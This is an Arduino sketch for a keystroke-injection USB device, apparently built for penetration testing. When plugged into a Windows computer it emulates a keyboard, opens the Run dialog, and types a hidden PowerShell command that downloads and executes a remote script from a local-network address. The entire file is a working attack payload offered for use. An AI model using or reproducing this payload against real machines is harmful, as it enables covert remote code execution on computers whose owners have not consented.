
#include <Keyboard.h> 
void setup()
{
  Keyboard.begin();
  Keyboard.begin();
  delay(1000);
  delay(500);
  Keyboard.press(KEY_LEFT_GUI);
  delay(500); 
  Keyboard.press('r');
  delay(500); 
  Keyboard.releaseAll();
  Keyboard.println("powershell  -WindowStyle Hidden IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.103/pentest/test.ps1');");
  delay(500); 
  Keyboard.press(KEY_RETURN);
  delay(500); 
  Keyboard.release(KEY_RETURN);
  Keyboard.end();
}

void loop()
{

}
